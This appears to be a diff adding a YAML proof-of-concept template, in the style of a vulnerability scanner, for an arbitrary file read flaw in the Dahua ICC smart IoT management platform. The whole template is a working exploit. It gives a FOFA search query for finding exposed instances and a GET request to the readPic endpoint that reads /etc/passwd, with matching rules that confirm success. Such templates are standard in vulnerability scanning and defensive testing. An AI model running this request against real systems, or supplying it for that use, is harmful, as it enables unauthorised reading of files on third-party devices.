@@ -1,0 +1,22 @@
+id: poc-yaml-dahua-icc-readpic-anyfileread
+info:
+  name: 大华ICC智能物联综合管理平台 readpic任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 大华ICC智能物联综合管理平台
+  fofa: body="*客户端会小于800*" && port="8443"
+requests:
+- method: GET
+  path: /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
+  expression: 'status_code == 200
+
+    && contains(body,"root:")
+
+    && contains(body,"/bin")
+
+    && !contains(body,"<")
+
+    '
+variables: {}
+transport: http
